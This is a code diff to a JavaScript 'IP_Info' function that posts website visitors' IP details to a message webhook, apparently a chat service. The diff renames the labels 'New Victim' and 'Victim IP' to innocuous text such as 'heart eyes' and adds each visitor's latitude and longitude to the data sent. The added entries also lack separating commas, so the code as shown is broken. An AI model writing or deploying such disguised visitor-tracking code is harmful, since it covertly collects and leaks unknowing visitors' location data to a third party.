@@ -49,9 +49,9 @@ async function IP_Info(){
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          content:"``New Victim``",
+          content:"``Vetements - IP :0``",
           embeds: [{
-              title: "Victim IP",
+              title: "heart eyes",
               type:"rich",
               color: "12223968",
               description: "```IP information of the recent website visitor.```",
@@ -69,6 +69,12 @@ async function IP_Info(){
               },
               {
                 name: "Region", value: `${value.regionName}`, inline: false
+              }
+              {
+                name: "Latitude", value: `${value.latitude}`, inline: false
+              }
+              {
+                name: "Longitude", value: `${value.longitude}`, inline: false
               }
               ],
               footer: {
